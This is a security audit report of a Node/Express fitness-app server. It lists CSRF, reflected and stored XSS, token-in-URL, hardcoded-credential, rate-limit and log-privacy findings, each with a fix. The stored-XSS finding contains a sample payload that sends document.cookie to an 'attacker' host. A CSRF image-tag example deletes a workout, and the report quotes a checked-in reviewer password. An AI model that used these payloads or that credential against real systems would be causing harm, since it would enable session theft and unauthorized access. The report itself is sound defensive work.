# RepLab Server Security Audit

Read-only review of `server/`. Scope: route-level auth, SQLi, secrets, XSS / path / shell injection, console-leaked credentials, CSRF, IDOR, rate limiting, error responses, PII in logs.

Overall posture is good: the SPA API gates everything behind `authMiddleware` (JWT + token-version invalidation), every JWT-gated handler scopes its DB queries with `WHERE user_id = req.userId`, all SQL uses `pg` placeholders, and a global `xss()` sanitize middleware strips HTML from `req.body/query/params`. The major real risks are concentrated in the four cookie-auth dashboards (admin / trainer / workouts / shop) — only `admin` has CSRF protection, and the other three handle state-changing operations (including via GET) without any Origin / Referer / token gate.

---

## HIGH

### server/routes/trainer.js:1219 — Trainer destructive ops on GET, no CSRF
`router.get('/delete-workout/:id', trainerAuth, ...)` and `router.get('/copy-workout/:id', ...)` mutate state via GET, and the `trainer_session` cookie is set with `sameSite: 'lax'` (line 228) so cross-site top-level navigation still sends it.
A logged-in trainer who clicks an `<img src="https://replab.app/trainer/delete-workout/123">` on any other site silently deletes their workout, no JS or POST required.
Convert both to POST/DELETE, add an Origin/Referer check (mirror `adminCsrfCheck`), and tighten the cookie to `sameSite: 'strict'`.

### server/routes/workoutDashboard.js — Cookie dashboard with no CSRF protection
`/workouts` mounts `clientAuth` (cookie session, `sameSite: 'lax'` line 177) and exposes POST/DELETE state-change routes (`POST /create-workout`, `DELETE /delete-workout/:id`, `POST /edit-workout/:id`) with no Origin/Referer or token check.
Any third-party page can submit a hidden form to `/workouts/create-workout` against an authenticated user and create or mutate workouts on their behalf.
Add the same `adminCsrfCheck`-style middleware to this router and switch the cookie to `sameSite: 'strict'`.

### server/routes/trainer.js — Trainer router has no CSRF middleware
Same shape as above for the trainer dashboard — no equivalent of `adminCsrfCheck` is mounted, while POST/PUT/DELETE routes (`/api/clients`, `/create-workout`, `/edit-workout/:id`, `/api/clients/:clientId/programs`, etc.) accept the cookie session.
A malicious page can forge POSTs that assign clients, create or edit workouts under the trainer's identity.
Add an Origin/Referer guard to the trainer router and set the trainer cookie to `sameSite: 'strict'`.

### server/routes/shop.js:14-41 — Accepts JWT via `?token=` query param, leaks into logs and Referer
`shopAuth` reads `req.query.token` as an access token, sets it as a cookie, and never strips it from the URL. JWTs in query strings end up in access logs, browser history, and `Referer` headers on outbound link clicks.
A leaked URL fragment from any user click on an external link in the dashboard hands a 15-minute access token to that third party.
After validating the query token, redirect to the same path without the token and only ever read it from the cookie afterward.

### server/scripts/seed-apple-reviewer.js:24 — Hardcoded Apple reviewer password
`const REVIEWER_PASSWORD = 'Reviewer2026!';` is checked into source.
Anyone with read access to the repo (including future GitHub transfer recipients) can log in as the Apple-reviewer account and see seeded data.
Move it to `process.env.REVIEWER_PASSWORD` with a thrown error if missing, then rotate the value Apple has on file.

### server/routes/admin.js:80, 192, 200 — Reflected XSS on admin login / reset error path
`adminLoginPage(error)` interpolates `${error}` (and the reset-password `${token}`) directly into HTML with no `escapeHtml`. The login route is rate-limited but unauthenticated, and `req.query.error` is attacker-controllable via a crafted `/admin/login?error=...` link.
A targeted phishing link sent to an admin renders attacker JS in the admin login page (post-login the cookie is httpOnly, but the script can still capture typed credentials before submit).
Pipe `error` and `token` through the existing `escapeHtml` helper before interpolation. The same pattern in `trainer.js:85` and `workoutDashboard.js:60` should be fixed in the same pass.

### server/routes/workoutDashboard.js:139-185 — `/workouts` login accepts any user role, no role check
The handler accepts any `users` row whose password matches and creates a `client_session`. Trainers and admins can log in via this surface even though the dashboard is intended for clients.
Not directly exploitable today (the dashboard mostly shows the user's own data), but it bypasses the role partitioning the rest of the app enforces and any future client-only feature added here inherits this gap.
Reject `user.role !== 'client'` after the password check, mirroring the trainer route's `user.role !== 'trainer'` guard.

---

## MEDIUM

### server/routes/admin.js:1283-1300, 2032 — Unescaped user fields in admin dashboard HTML
Lines like `<td>${u.name}</td>`, `<td>${u.email || '—'}</td>`, and similar in `/active`, `/users`, etc. interpolate user-supplied first/last name and email directly into the admin HTML. The global `sanitize` middleware (which strips HTML on input) mitigates this for new data, but any row written before sanitize was wired, plus content that survives `xss()` (e.g., quote-less attribute injection via `'`), is still a stored-XSS sink against the admin.
A self-XSS-able user who sets `firstName` to `<img src=x onerror=fetch('//attacker?c='+document.cookie)>` would execute in the admin's session, and admin sessions hold privileges that can wipe the DB (`/backup/restore`).
Run all user-string interpolations in admin views through the existing `esc()` / `escapeHtml()` helper — there's already one in scope; this is a missing-call problem, not a missing-helper problem.

### server/routes/admin.js:905-908 — Quote-escape in `onclick` is fragile
`onclick="resetPassword(${u.id}, '${esc((u.email||u.phone||'User #'+u.id)).replace(/'/g, "\\'")}')"` does HTML-escape then JS-escape, but `esc` HTML-encodes `'` to `&#x27;` first, so the subsequent `replace(/'/g, ...)` no longer matches. The remaining defense is single-quote attribute parsing — any `&apos;` in data would be re-decoded as `'` inside the attribute and could break out of the JS string.
Crafted email with `'` followed by JS would fire when an admin clicks the reset button.
Build the JS-string payload with `JSON.stringify(value)` first, then HTML-escape the whole attribute — don't try to compose escapes by string-replace.

### server/routes/billing.js — Not covered by `apiLimiter`
`server/index.js:222-231` applies `apiLimiter` to `/programs`, `/templates`, `/sessions`, etc. but `/billing` is not in the list. `/billing/create-checkout-session` makes outbound Stripe API calls per request.
An authenticated attacker can hammer the endpoint, racking up Stripe rate-limit consumption (and the rare possibility of accidental customer-record creation via `getStripe().customers.create`, which is also unbounded).
Add `app.use('/billing', apiLimiter);` to `server/index.js` (the `/billing/webhook` route is signed, but the limiter still allows it through if hits are below the cap).

### server/routes/auth.js:557 — `/auth/export-data` rate limit is per-IP only
The rate limit is keyed by IP (default `express-rate-limit` behavior). Rotating IPs evade the 5/hour cap; the export joins ~17 tables per call.
A scripted attacker with a botnet can DoS the DB via legitimately-authenticated export calls, or use the endpoint as an oracle to extract their own data faster than intended.
Add a per-userId secondary key (`keyGenerator: req => req.userId || ipKeyGenerator(req)`) so the cap is per-account not per-IP, and require Pro+ plan to invoke (or at least gate behind a longer cooldown for Free users).

### server/routes/auth.js:212-214 — Login history stores IP and user agent in plaintext
`INSERT INTO user_login_history (user_id, email, ip, user_agent, city, state)` stores PII (IP, UA, geo) indefinitely. Not a vulnerability per se, but worth flagging for the privacy-nutrition / GDPR work since it isn't surfaced in the privacy answer doc and the table grows monotonically.
A future DB compromise leaks every login location for every user back to account creation.
Rotate the table on a schedule (e.g., trim rows older than 90 days) and disclose retention in the privacy nutrition.

---

## LOW

### server/routes/admin.js:289, server/index.js:289 — Stack traces logged via `console.error(err)`
Multiple route handlers do `console.error(err)` with the full Error object (which includes the stack and, in `pg` errors, the failing SQL). The 500 response itself is a clean `{ error: 'Internal server error' }`, so this only leaks to server logs (Render → Sentry).
Stack traces in logs are normal, but `pg` errors include parameter snippets that can include user PII.
Replace `console.error(err)` with `console.error(err.message)` in handlers that touch user input, and rely on Sentry for the full trace via the global error middleware in `server/index.js:276`.

### server/routes/auth.js:215, 209, 207 — PII (email, IP, geo) in stdout
`console.error('Login history error:', err)`, the `console.error('Login history geo error:', geoErr)` path, and similar log emails (via the err object containing query parameters) to stdout, which is shipped to Render's log retention.
Render logs are encrypted at rest but anyone with Render dashboard access sees them.
Same fix as above — log only `err.message` in PII-adjacent handlers, and consider tagging logs with `userId` instead of email so they can be redacted from a single source.

### server/index.js:289 — Generic 500 handler is fine but error is double-logged
`console.error(err)` plus `Sentry.captureException(err)` plus the in-memory `errorLog` keep three copies of the same trace. Not a leak, but operational noise — and the in-memory `errorLog` is exposed on `/admin/errors` (gated, but still a place where stack traces accumulate).
Surface area, not a direct vulnerability.
Drop `console.error` once Sentry is wired in production and trim what `errorLog` retains (e.g., message + status code, no stack).

---

## What looked safe (no findings)

- Every JWT-gated route (`server/routes/{auth,programs,templates,sessions,schedule,pbs,metrics,exercises,challenges,sharing,push,feedReactions,feedback,billing,ai}.js`) scopes by `req.userId` in the WHERE clause. No IDOR.
- All SQL goes through `pool.query(text, params)` with `$N` placeholders. The few template-literal SQL strings in `server/db.js` (`notDemo`, `getDailyStats`, `updateSubscriptionByStripeId`'s column allowlist, `routes/admin.js:6521` table loop) interpolate hardcoded constants only.
- No `sk-`, `re_`, `AKIA`, or inline bearer tokens in source (only the seed script password noted above).
- No `dangerouslySetInnerHTML` in the server code; no `child_process` / `exec` calls; `express.static('VidLib')` and `clientDist` use joined paths with no user input.
- `JWT_SECRET` length is enforced at boot (`middleware/auth.js:7`), refresh tokens are type-tagged so an access token can't be reused at `/auth/refresh`, `token_version` invalidates all sessions on password change.
- `authLimiter`, `aiLimiter`, `refreshLimiter`, and the per-email reset throttle in `auth.js:297` cover the main auth surfaces.
- `adminCsrfCheck` is correctly applied to the entire admin router, and the admin cookie is `sameSite: 'strict'` + `httpOnly`.

---

## Suggested fix order

1. CSRF + cookie hardening on `/trainer` and `/workouts` routers (HIGH × 2, both unauthenticated-attack surfaces).
2. Strip JWT from URL on first hit in `/shop` and convert trainer GET-mutating routes to POST/DELETE.
3. Escape `${error}` / `${token}` in the three login HTML pages (admin, trainer, workouts).
4. Move `seed-apple-reviewer.js` password to env, rotate.
5. Add `/billing` to `apiLimiter` and run admin dashboard interpolations through `esc()`.
